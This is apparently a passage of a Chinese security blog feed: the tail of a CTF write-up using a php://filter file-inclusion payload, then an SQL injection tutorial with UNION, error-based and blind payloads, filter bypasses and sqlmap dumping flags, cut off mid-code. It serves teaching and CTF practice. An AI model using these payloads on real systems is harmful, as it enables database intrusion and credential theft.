invoke__">stristr</span>(<span class="variable">$file</span>, <span class="string">&quot;tp&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>即构造一个伪协议，payload如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file=php:<span class="comment">//filter/resource=flag.php</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250116170023492.png" alt="image-20250116170023492"></p><p>提示就在这里但是看不到，尝试base64编码后读取，payload如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250116170256946.png" alt="image-20250116170256946"></p><p>将下列字符解码后得到</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250116170330203.png" alt="image-20250116170330203"></p><p>贴一个python的base64解码脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base64_decoder</span>(<span class="params">encoded_string</span>):  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        decoded_bytes = base64.b64decode(encoded_string)  </span><br><span class="line">        decoded_string = decoded_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)  </span><br><span class="line">        <span class="keyword">return</span> decoded_string  </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;解码失败: <span class="subst">&#123;e&#125;</span>&quot;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 示例用法  </span></span><br><span class="line">encoded_string = <span class="built_in">input</span>(<span class="string">&quot;请输入待解码字符串:&quot;</span>)  <span class="comment"># 这是的Base64编码  </span></span><br><span class="line">decoded_string = base64_decoder(encoded_string)  </span><br><span class="line"><span class="built_in">print</span>(decoded_string) </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 赛题复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入基础</title>
      <link href="/2024/12/09/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/12/09/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="0×01原理"><a href="#0×01原理" class="headerlink" title="0×01原理"></a>0×01原理</h1><p>攻击者在进行数据库查询时恶意构造查询语句，使得查询语句能够得到任意攻击者想要的信息(永远不要相信用户的输入)</p><h1 id="0×02类型"><a href="#0×02类型" class="headerlink" title="0×02类型"></a>0×02类型</h1><p>按查询来分可分为字符型和数字型(主要区别是字符型需要闭合而数字型无闭合)</p><p>按注入方式可分为union注入、报错注入、盲注、文件上传注入等</p><h2 id="判断方法"><a href="#判断方法" class="headerlink" title="判断方法"></a>判断方法</h2><h3 id="判断有无注入"><a href="#判断有无注入" class="headerlink" title="判断有无注入"></a>判断有无注入</h3><p>首先在参数后加上单引号(无论字符型还是数字型都会因单引号个数不匹配报错)</p><h3 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><p>1.输入and 1&#x3D;1和and 1&#x3D;2    若均为正常则为字符型，第二个报错即为数字型</p><p>2.输入id&#x3D;1和id&#x3D;2-1   若结果相同则为数字型，第二个不同则为字符型</p><p>以ctfshow171举例</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241209184228405.png" alt="image-20241209184228405"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[<span class="string">&#x27;id&#x27;</span>].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure><p>传入的id参数被嵌入到查询语句中，那么只需要在传入参数时将前单引号闭合，后单引号注释，就能获得想得到的数据(以下仅剖析id&#x3D;的语句)</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--+&#x27;  传入参数为1&#x27; and 1=1--+,--+是为了注释掉后面的引号,有回显有数据</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241209184944216.png" alt="image-20241209184944216"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span><span class="comment">--+&#x27;  传入参数为1&#x27; and 1=2--+，有回显无数据未报错</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241209185248009.png" alt="image-20241209185248009"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=&#x27;1&#x27;              传入参数为1，有数据</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241209185717397.png" alt="image-20241209185717397"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="string">&#x27;2-1&#x27;</span>            传入参数为<span class="number">2</span><span class="number">-1</span>，有数据，但与上述不同</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241209185602570.png" alt="image-20241209185602570"></p><p>即都可判断出该题为字符型注入</p><h1 id="0×03前置学习"><a href="#0×03前置学习" class="headerlink" title="0×03前置学习"></a>0×03前置学习</h1><h2 id="1-闭合方式-数字型不用管闭合方式"><a href="#1-闭合方式-数字型不用管闭合方式" class="headerlink" title="1.闭合方式(数字型不用管闭合方式)"></a>1.闭合方式(数字型不用管闭合方式)</h2><p>常见闭合有’       “       ‘)            “)等,实际注入过程中可以多次尝试</p><h2 id="2-注释符"><a href="#2-注释符" class="headerlink" title="2.注释符"></a>2.注释符</h2><p>常见注释符有–+，#，%23等</p><h2 id="3-常规注入方法"><a href="#3-常规注入方法" class="headerlink" title="3.常规注入方法"></a>3.常规注入方法</h2><ol><li>查找注入点</li><li>判断字符型还是数字型，若是字符型要找到闭合方式</li><li>查询列数(order by,group by进行二分法判断)</li><li>找到回显位(id通常传参为不存在数据0或者-1，使回显能够直接显示而没有查询出来的数据进行干扰)</li><li>爆数据库名</li><li>爆表名</li><li>爆列名</li><li>爆数据</li></ol><h2 id="4-常见过滤及绕过"><a href="#4-常见过滤及绕过" class="headerlink" title="4.常见过滤及绕过"></a>4.常见过滤及绕过</h2><h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><p>编码绕过:%20 %09 %0a %0b %0c %0d %a0 %00</p><p>内联注释:&#x2F;**&#x2F; &#x2F;*字符串*&#x2F;</p><p>括号绕过:即添加括号代替空格，比如我们的正常语句为select user from ctfshow，现在我们就可以改成select(user)from(ctfshow)</p><h3 id="注释符过滤"><a href="#注释符过滤" class="headerlink" title="注释符过滤"></a>注释符过滤</h3><p>–+,#,%23,–%0c,–%01(控制字符,用于特殊文件开头,可用于注释符)</p><p>也可以用”||”1、” or “1”&#x3D;”1，甚至是”union select 1,2,”3进行闭合</p><h3 id="select过滤"><a href="#select过滤" class="headerlink" title="select过滤"></a>select过滤</h3><p>复写绕过(比如seselectlect),大小写绕过(比如Select)</p><h3 id="引号过滤"><a href="#引号过滤" class="headerlink" title="引号过滤"></a>引号过滤</h3><p>转为16进制字符串，这样就不用使用引号</p><p>通过传入\转义绕过，参考<a href="https://yxing-1.github.io/2024/12/03/ctfshow-sql%E6%B3%A8%E5%85%A5/">web233</a></p><h3 id="逗号过滤"><a href="#逗号过滤" class="headerlink" title="逗号过滤"></a>逗号过滤</h3><h4 id="from-for-盲注"><a href="#from-for-盲注" class="headerlink" title="from for(盲注)"></a>from for(盲注)</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> substr(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br><span class="line"><span class="keyword">select</span> mid(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br><span class="line">等价于mid<span class="operator">/</span>substr(database(),<span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h4 id="offset"><a href="#offset" class="headerlink" title="offset"></a>offset</h4><p>盲注的时候除了<code>substr()</code>和<code>mid()</code>需要使用逗号，<code>limit()</code>也会使用逗号，比如语句<code>select * from sheet1 limit 0,1 </code>,这时我们可以使用<code>select * from sheet1 limit 1 offset 0</code> 等效替代</p><h4 id="join"><a href="#join" class="headerlink" title="join"></a>join</h4><p>select 1,2等价于select * from (select 1)a join (select 2)b</p><h4 id="like"><a href="#like" class="headerlink" title="like"></a>like</h4><p>select ascii(mid(user(),1,1))&#x3D;114等价于select user() like ‘r%’，即逐个字符串比较，我们可以暴力破解%前的字符串，直到爆破出select user() like ‘root@localhost’，得到真正的用户名</p><h3 id="or-and-xor-not过滤"><a href="#or-and-xor-not过滤" class="headerlink" title="or and xor not过滤"></a>or and xor not过滤</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and=&amp;&amp;</span><br><span class="line">or=|| </span><br><span class="line">xor=^</span><br><span class="line">not=!</span><br></pre></td></tr></table></figure><h1 id="0x04常规注入"><a href="#0x04常规注入" class="headerlink" title="0x04常规注入"></a>0x04常规注入</h1><h2 id="一-union注入"><a href="#一-union注入" class="headerlink" title="一.union注入"></a>一.union注入</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><blockquote><p>联合注入即union注入，其作用就是，在原来查询条件的基础上，通过系统关键字<code>union</code>从而拼接上我们自己的<code>select</code>语句，然后把后面<code>select</code>得到的结果将拼接到前面<code>select</code>的结果后边。如：前个<code>select</code>得到2条数据，后个<code>select</code>也得到2条数据，那么后个<code>select</code>的数据将拼接到第一个<code>select</code>返回的内容中。</p><p>联合注入有它的利用条件，UNION 内部的 SELECT 语句必须拥有相同数量的列，列也必须拥有相似的数据类型，每条 SELECT 语句中的列的顺序必须相同。即</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">&gt;</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> table_name1 <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> <span class="keyword">from</span> table_name2;</span><br></pre></td></tr></table></figure></blockquote><h3 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">group_concat(a)                 将a中所有数据在一行中输入出来</span><br><span class="line">group_concat(a,b,c)             将a和c中间以b连接在一行中输出 </span><br></pre></td></tr></table></figure><h3 id="关键库，表，列"><a href="#关键库，表，列" class="headerlink" title="关键库，表，列"></a>关键库，表，列</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">information_schema:包含mysql简要信息的集合</span><br><span class="line"></span><br><span class="line">information_scheme.schemata：库名集合表</span><br><span class="line"></span><br><span class="line">information_schema.tables:表名集合表</span><br><span class="line"></span><br><span class="line">information_schema.columns:列名集合表</span><br><span class="line"></span><br><span class="line">information_schema.statistics:索引集合表</span><br></pre></td></tr></table></figure><h3 id="查询语句"><a href="#查询语句" class="headerlink" title="查询语句"></a>查询语句</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,2,3 --+(判断回显位)</span></span><br><span class="line"><span class="string">id=0&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),<span class="number">3</span><span class="comment">--+(爆库名)</span></span><br><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3--+</span></span><br><span class="line"><span class="string">id=0&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,table_name,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;database()&#x27;</span><span class="comment">--+(爆该数据库中所有表名)</span></span><br><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27;and table_name=&#x27;</span>users<span class="string">&#x27;--+(在security库，users表中爆所有列名)</span></span><br><span class="line"><span class="string">id=0&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(username,<span class="string">&#x27;~&#x27;</span>,password),<span class="number">3</span> <span class="keyword">from</span> users<span class="comment">--+(在user表中输出所有username和password，之间以~连接)</span></span><br><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,(select password from users where username=&#x27;</span>flag<span class="string">&#x27;),3--+(使用子查询语句查询user表中username为flag的password)</span></span><br></pre></td></tr></table></figure><h2 id="二-报错注入"><a href="#二-报错注入" class="headerlink" title="二.报错注入"></a>二.报错注入</h2><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><p>构造语句，让错误信息夹杂可以显示数据库内容的查询语句，返回报错提示中含数据库内容</p><h3 id="常见类型"><a href="#常见类型" class="headerlink" title="常见类型"></a>常见类型</h3><h4 id="extractValue-函数报错"><a href="#extractValue-函数报错" class="headerlink" title="extractValue()函数报错"></a>extractValue()函数报错</h4><h5 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h5><p> MySQL 中用于从 XML 数据中提取特定值的函数，可以根据 XPath 表达式从 XML 文档中提取所需的信息。</p><h5 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">EXTRACTVALUE(xml_target, xpath_expression)</span><br></pre></td></tr></table></figure><ul><li><code>xml_target</code>: 包含 XML 数据的字符串或表达式。</li><li><code>xpath_expression</code>: 一个 XPath 表达式，用于指定要提取的 XML 元素或属性。</li><li><code>EXTRACTVALUE()</code> 函数返回与 XPath 表达式匹配的 XML 元素的文本内容。如果找不到匹配项，则返回空字符串。</li></ul><h5 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h5><blockquote><p>1.先在ctfstu数据库内创建表xml</p><p>2.在表内插入两段数据</p></blockquote><p>1.把查询参数路径写错(查询不到内容,但不会报错)</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(doc,<span class="string">&#x27;/book/titlelll&#x27;</span> ) <span class="keyword">from</span> xml;</span><br></pre></td></tr></table></figure><p>2.把查询参数格式符号写错(提示报错)</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(doc,<span class="string">&#x27;~book/title&#x27;</span>) <span class="keyword">from</span> xml;</span><br></pre></td></tr></table></figure><p>3.报错方法</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">100</span><span class="string">&#x27; union select 1,extractvalue(1,concat(0x7e,(select database()))),3 --+</span></span><br><span class="line"><span class="string">?id=100&#x27;</span><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database())))<span class="comment">--+</span></span><br><span class="line">注:concat为拼接，<span class="number">0x7e</span>为<span class="operator">~</span>的ASCII码</span><br></pre></td></tr></table></figure><p>4.获取信息</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">100</span><span class="string">&#x27; and 1=extractvalue(1,concat(0x7e,(select group concat(table_name) from information_schema.tables where table_schema= database())))--+</span></span><br><span class="line"><span class="string">#获取所需数据表表名users</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=100&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span> database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>)))<span class="comment">--+</span></span><br><span class="line">#获取所需数据列列名username和password</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">100</span><span class="string">&#x27; and 1=extractvalue(1,concat(0x7e,(select group_concat(username,&#x27;</span><span class="operator">~</span><span class="string">&#x27;,password)from users ))--+</span></span><br><span class="line"><span class="string">#可加分隔符区分(默认只返回32个字符)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=100&#x27;</span><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="built_in">substring</span>(group_concat(username,<span class="string">&#x27;~&#x27;</span>,password),<span class="number">25</span>,<span class="number">30</span>) <span class="keyword">from</span> users)))<span class="comment">--+</span></span><br><span class="line">#使用函数<span class="built_in">substring</span>(显示内容,开始字符,显示位数)解决只能返回<span class="number">32</span>个字符串问题</span><br></pre></td></tr></table></figure><h4 id="updatexml-函数报错"><a href="#updatexml-函数报错" class="headerlink" title="updatexml()函数报错"></a>updatexml()函数报错</h4><h5 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h5><p>用于在 XML 文档中更新或插入特定的节点。它主要用于 XML 数据的操作和处理。</p><h5 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">UPDATEXML(target_xml, xpath_expr, new_xml)</span><br></pre></td></tr></table></figure><ul><li><code>target_xml</code>: 要操作的 XML 文档。</li><li><code>xpath_expr</code>: XPath 表达式，用于定位要更新的节点。</li><li><code>new_xml</code>: 新的 XML 内容，用于替换或插入到指定位置。</li></ul><h5 id="举例-1"><a href="#举例-1" class="headerlink" title="举例"></a>举例</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> updatexml(<span class="number">1</span>, CONCAT(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>)) x)</span><br></pre></td></tr></table></figure><h4 id="floor-函数报错"><a href="#floor-函数报错" class="headerlink" title="floor()函数报错"></a>floor()函数报错</h4><h5 id="使用函数"><a href="#使用函数" class="headerlink" title="使用函数"></a>使用函数</h5><blockquote><p><code>rand()</code>:随机返回0~1间的值 </p><p><code>select rand() from users;</code> **根据users行数随机显示结果 **</p><p><code>rand(0)*2</code><strong>固定报错</strong></p><p><code>floor()</code>:小数向下取整数</p><p><code>concat_ws(符号,数据1,数据2)</code>:将括号内数据用第一个字段连接起来 </p><p><code>as</code>:别名</p><p><code>group by</code>:分组</p><p><code>count(*)</code>:汇总统计数量 </p></blockquote><h5 id="报错原理"><a href="#报错原理" class="headerlink" title="报错原理"></a>报错原理</h5><p><strong>统计时没有的结果则重新计算并写入</strong></p><h5 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h5><blockquote><p>1.确认字符注入(闭合符号)&#x2F;数字注入，前段语句查询列数</p><p>2.floor报错</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,count(*),concat_ws(&#x27;</span><span class="operator">-</span><span class="string">&#x27;,(select group_concat(username,&#x27;</span>:<span class="string">&#x27;,password)from users,floor(0)*2))as a from information_schema.tables group by a--+</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="三-布尔盲注"><a href="#三-布尔盲注" class="headerlink" title="三.布尔盲注"></a>三.布尔盲注</h2><h2 id="四-时间盲注"><a href="#四-时间盲注" class="headerlink" title="四.时间盲注"></a>四.时间盲注</h2><p>布尔&#x2F;时间盲注就是有&#x2F;无回显的区别，都不能回显出有用信息，但是布尔盲注根据对信息查询有不同的回显结果，时间盲注通过几个关键函数来对条件进行判断，通过响应延时来判断条件是否正确</p><h3 id="主要函数"><a href="#主要函数" class="headerlink" title="主要函数"></a>主要函数</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">ascii():将内容返回ascii值</span><br><span class="line">substr(string,<span class="number">1</span>,<span class="number">2</span>):将字符串从<span class="number">1</span>开始取<span class="number">2</span>位,第二个参数从<span class="number">1</span>开始(和limit的第二个参数从<span class="number">0</span>开始区分)  例如substr(<span class="string">&#x27;length&#x27;</span>,<span class="number">1</span>,<span class="number">2</span>)<span class="operator">=</span><span class="string">&#x27;le&#x27;</span></span><br><span class="line">if(bool,<span class="literal">true</span>,<span class="literal">false</span>):判断语句，条件关系式成立执行<span class="literal">true</span>内容，不成立则执行<span class="literal">false</span>内容</span><br><span class="line">sleep(<span class="number">3</span>):响应延迟<span class="number">3</span>秒</span><br><span class="line">benchmark(<span class="number">100</span>,md5(<span class="string">&#x27;test&#x27;</span>)):对test进行md5加密<span class="number">100</span>次，后面的表达式可以随意替换，主要使服务器响应有延迟就行</span><br><span class="line"></span><br><span class="line">其他函数及用法在实战中再进行补充吧，<span class="keyword">sql</span>的姿势太多了，还得认真慢慢学，下面是一些常用payload</span><br><span class="line">布尔盲注</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (ascii(substr(database(),1,1))=99)#      #如果数据库第一个字母为c(ASCII值99)才返回正确</span></span><br><span class="line"><span class="string">时间盲注</span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span>  (if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">99</span>,sleep(<span class="number">2</span>),<span class="number">0</span>))#     #如果数据库第一个字母为c才休眠<span class="number">2</span>秒</span><br></pre></td></tr></table></figure><p> 注意，在进行时间盲注时时间不是绝对的，要根据网络情况等适当更改，不然容易炸(做题时吃了巨多亏)</p><h2 id="五-sqlmap注入"><a href="#五-sqlmap注入" class="headerlink" title="五.sqlmap注入"></a>五.sqlmap注入</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>sqlmap是一款kali自带的基于python的自动化SQL注入工具,打开后输入<code>python sqlmap.py</code>出现以下界面即可使用</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241229181644397.png" alt="image-20241229181644397"></p><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-u                                指定url,检测注入点</span><br><span class="line"></span><br><span class="line">-m                                指定文件(可批量扫描)</span><br><span class="line"></span><br><span class="line">-r                                post请求(BP抓包放到文件中)</span><br><span class="line"></span><br><span class="line">--cookie                          cookie注入</span><br><span class="line"></span><br><span class="line">-D                                指定数据库</span><br><span class="line"></span><br><span class="line">-T                                指定表</span><br><span class="line"></span><br><span class="line">-C                                指定列</span><br></pre></td></tr></table></figure><h4 id="脱库"><a href="#脱库" class="headerlink" title="脱库"></a>脱库</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-b                                获取数据库版本</span><br><span class="line"></span><br><span class="line">--current-db                      当前数据库</span><br><span class="line"></span><br><span class="line">--dbs                             获取数据库</span><br><span class="line"></span><br><span class="line">--tables                          获取表</span><br><span class="line"></span><br><span class="line">--columns                         获取列</span><br><span class="line"></span><br><span class="line">--schema                          字段类型</span><br><span class="line"></span><br><span class="line">--dump                            获取数据</span><br><span class="line"></span><br><span class="line">--start                           开始的行</span><br><span class="line"></span><br><span class="line">--stop                            结束的行</span><br><span class="line"></span><br><span class="line">--search                          搜索库/表/字段</span><br><span class="line"></span><br><span class="line">--tamper                          WAF绕过</span><br></pre></td></tr></table></figure><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--batch                           不再询问确认</span><br><span class="line"></span><br><span class="line">--method=GET                      指定请求方式</span><br><span class="line"></span><br><span class="line">--random-agent                    随机UA</span><br><span class="line"></span><br><span class="line">--user-agent XX                   指定UA</span><br><span class="line"></span><br><span class="line">--referer XX                      指定referer</span><br><span class="line"></span><br><span class="line">--proxy=&quot; &quot;                       代理</span><br><span class="line"></span><br><span class="line">--threads 10                      线程数(1-10)</span><br><span class="line"></span><br><span class="line">--level=1                         测试等级(1-5)</span><br><span class="line"></span><br><span class="line">--risk=1                          风险等级(0-3)</span><br></pre></td></tr></table></figure><h2 id="六-其他注入"><a href="#六-其他注入" class="headerlink" title="六:其他注入"></a>六:其他注入</h2><h3 id="order-by和limit注入"><a href="#order-by和limit注入" class="headerlink" title="order by和limit注入"></a>order by和limit注入</h3><p>摘抄于:<a href="https://blog.csdn.net/fly_enum/article/details/133275430">SQL特殊位置注入：order注入和limit注入_sql注入limit-CSDN博客</a></p><h4 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h4><p>在了解order注入和limit注入之前要先了解sql的语法顺序和执行顺序</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">sql</span>语法顺序</span><br><span class="line"><span class="keyword">select</span>[<span class="keyword">distinct</span>]</span><br><span class="line"><span class="keyword">from</span> </span><br><span class="line"><span class="keyword">join</span>(如<span class="keyword">left</span> <span class="keyword">join</span>)</span><br><span class="line"><span class="keyword">on</span></span><br><span class="line"><span class="keyword">where</span></span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span></span><br><span class="line"><span class="keyword">having</span> </span><br><span class="line"><span class="keyword">union</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line">limit</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">sql</span>执行顺序</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line"><span class="keyword">on</span></span><br><span class="line"><span class="keyword">join</span></span><br><span class="line"><span class="keyword">where</span></span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span>:<span class="keyword">group</span> <span class="keyword">by</span> 子句将数据划分为多个分组；</span><br><span class="line">sum,count,max,min,avg:聚合函数</span><br><span class="line"><span class="keyword">having</span>:使用<span class="keyword">having</span>子句筛选分组</span><br><span class="line"><span class="keyword">select</span>:选择需要的列</span><br><span class="line"><span class="keyword">distinct</span>(去重):对结果进行去重操作</span><br><span class="line"><span class="keyword">union</span>:将多个查询结合联合，会重复上面步骤</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span>:对结果进行排序</span><br><span class="line">limit:返回的条数</span><br></pre></td></tr></table></figure><p>这两种注入就是将输入的数据放在对应位置查找，由于位置不同，对应注入方式也不同</p><h4 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a>order by注入</h4><h5 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> column1, column2, ... <span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">Order</span> <span class="keyword">by</span> 后面默认跟要查询的字段，可以为多个字段，也可以用数字来代替，表示用第几个字段进行排序，这种方式经常用来判断表中有几个字段。</span><br><span class="line">字段后面可以跟升序或者降序排序</span><br><span class="line"><span class="keyword">ASC</span>升序排序，默认为升序排序</span><br><span class="line"><span class="keyword">DESC</span>降序排序</span><br></pre></td></tr></table></figure><h5 id="注入判断"><a href="#注入判断" class="headerlink" title="注入判断"></a>注入判断</h5><p>1）可以改变order by后的列名看排序是否改变来判断是在order by后面的注入点。然后加上ASC|DESC看结果排序是否有改变，有改变则证明有注入点</p><p>2）通过bool类型进行判断，下面两个页面如果返回结果不同，则证明有注入点</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">select</span> 